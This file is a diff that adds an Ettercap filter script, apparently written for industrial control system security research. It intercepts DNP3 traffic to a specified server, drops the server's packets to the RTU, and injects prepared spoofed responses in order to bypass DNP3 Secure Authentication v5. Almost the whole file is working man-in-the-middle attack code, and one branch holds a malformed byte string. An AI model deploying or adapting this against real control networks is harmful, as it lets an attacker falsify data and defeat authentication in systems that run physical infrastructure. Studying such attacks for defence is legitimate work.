@@ -1,0 +1,108 @@
+###########################################
+# Name: dnp3-replace-chunks.filter
+# Description: Monitor for DNP3 requests. 
+#              Allow the RTU to ACK then replace the data 
+#              in the SAv5 challenge with DNP3 data.
+#              This bypasses SAv5 checks. 
+#
+# Created by: Don C. Weber (@cutaway)
+# Date Created: November 2022
+# Version: 0.1
+# 
+# Calculating DNP3 CRC using Python
+# import crcmod.predefined
+# crcdnp = crcmod.predefined.mkCrcFun('crc-16-dnp')
+# data = '01010101010101010101010101010101'
+# hex(crcdnp(bytes.fromhex(data)))
+# '0xc3bb' <- Output. Flip these bytes to little-endian for the packet data '\xbb\xc3' 
+#
+###########################################
+
+
+# Checking to see if the destination is the server and the protocol is DNP3
+# Note: The IP address will need to be updated for your server
+
+if (ip.dst == '192.168.0.21') {
+    if (tcp.src == 20000) {
+        # Check for DNP3 message and a DNP3 data and request is a read. 
+        if (DATA.data == "\x05\x64") {
+            # 00 01 02 03 04 05 06 07 08 09 10 11 12 13 14 15 16 17 Byte offsets
+            # 05 64 0b c4 01 00 0a 00 fd f1 c0 cb 01 01 00 06 18 4f
+            if (DATA.data + 12 == "\x83") {
+                # Printing a message when the filter fires.
+                msg("DNP3 Injecting Packet Attempt");
+                # Drop DNP3 packets from server to RTU
+                drop();
+                # Inject response to server, simulating it is from RTU
+                # We must account for all session nibbles
+                # Dat files must contain ALL of the DNP3 data to be replaced.
+                if (DATA.data + 11 == "\xc0") {
+                    msg("    DNP3 Packet Injecting c0");
+                    inject("./ettercap_dnp3_data_modded_c0.dat");
+                }
+                if (DATA.data + 11 == "\xc1") {
+                    msg("    DNP3 Packet Injecting c1");
+                    inject("./ettercap_dnp3_data_modded_c1.dat");
+                }
+                if (DATA.data + 11 == "\xc2") {
+                    msg("    DNP3 Packet Injecting c2");
+                    inject("./ettercap_dnp3_data_modded_c2.dat");
+                }
+                if (DATA.data + 11 == "\xc3") {
+                    msg("    DNP3 Packet Injecting c3");
+                    inject("./ettercap_dnp3_data_modded_c3.dat");
+                }
+                if (DATA.data + 11 == "\xc4") {
+                    msg("    DNP3 Packet Injecting c4");
+                    inject("./ettercap_dnp3_data_modded_c4.dat");
+                }
+                if (DATA.data + 11 == "\xc5") {
+                    msg("    DNP3 Packet Injecting c5");
+                    inject("./ettercap_dnp3_data_modded_c5.dat");
+                }
+                if (DATA.data + 11 == "\xc6") {
+                    msg("    DNP3 Packet Injecting c6");
+                    inject("./ettercap_dnp3_data_modded_c6.dat");
+                }
+                if (DATA.data + 11 == "\xc7") {
+                    msg("    DNP3 Packet Injecting c7");
+                    inject("./ettercap_dnp3_data_modded_c7.dat");
+                }
+                if (DATA.data + 11 == "\xc8") {
+                    msg("    DNP3 Packet Injecting c8");
+                    inject("./ettercap_dnp3_data_modded_c8.dat");
+                }
+                if (DATA.data + 11 == "\xc9") {
+                    msg("    DNP3 Packet Injecting c9");
+                    inject("./ettercap_dnp3_data_modded_c9.dat");
+                }
+                if (DATA.data + 11 == "c\xa") {
+                    msg("    DNP3 Packet Injecting ca");
+                    inject("./ettercap_dnp3_data_modded_ca.dat");
+                }
+                if (DATA.data + 11 == "\xcb") {
+                    msg("    DNP3 Packet Injecting cb");
+                    inject("./ettercap_dnp3_data_modded_cb.dat");
+                }
+                if (DATA.data + 11 == "\xcc") {
+                    msg("    DNP3 Packet Injecting cc");
+                    inject("./ettercap_dnp3_data_modded_cc.dat");
+                }
+                if (DATA.data + 11 == "\xcd") {
+                    msg("    DNP3 Packet Injecting cd");
+                    inject("./ettercap_dnp3_data_modded_cd.dat");
+                }
+                if (DATA.data + 11 == "\xce") {
+                    msg("    DNP3 Packet Injecting ce");
+                    inject("./ettercap_dnp3_data_modded_ce.dat");
+                }
+                if (DATA.data + 11 == "\xcf") {
+                    msg("    DNP3 Packet Injecting cf");
+                    inject("./ettercap_dnp3_data_modded_cf.dat");
+                }
+                msg("    DNP3 Injected Happy Hunting");
+            }
+        }
+    }
+}
+
